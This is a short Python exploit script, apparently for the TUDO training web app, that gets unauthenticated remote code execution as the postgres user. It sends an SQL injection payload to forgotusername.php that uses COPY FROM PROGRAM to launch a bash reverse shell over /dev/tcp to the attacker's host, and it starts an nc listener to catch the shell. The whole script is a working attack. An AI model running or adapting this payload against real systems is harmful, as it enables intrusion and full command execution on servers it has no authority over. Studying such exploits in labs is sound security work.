# TUDO Unauthenticated RCE as postgres #1 - "UDF"
# William Moody
# December 22, 2025

import requests
import argparse
import subprocess
import time

# Parse arguments
parser = argparse.ArgumentParser(description="Exploits SQLi in forgotusername.php to get RCE as postgres")
parser.add_argument("target",help="Target URL")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="9999")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Start listener
print("[*] Starting listener...")
subprocess.Popen(["nc","-nvlp", f"{args.lport}"])
time.sleep(1)

# Trigger RCE via SQLi
print("[*] Triggering RCE via SQLi...")
payload  =  "';DROP TABLE IF EXISTS command;"
payload +=  "CREATE TABLE command(output TEXT);"
payload += f"COPY command FROM PROGRAM 'echo \"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\" | bash';"
payload +=  "DROP TABLE IF EXISTS command;--"
requests.post(
    f"{args.target}/forgotusername.php",
    data={"username":payload}
)

# Keep shell open
while True:
    pass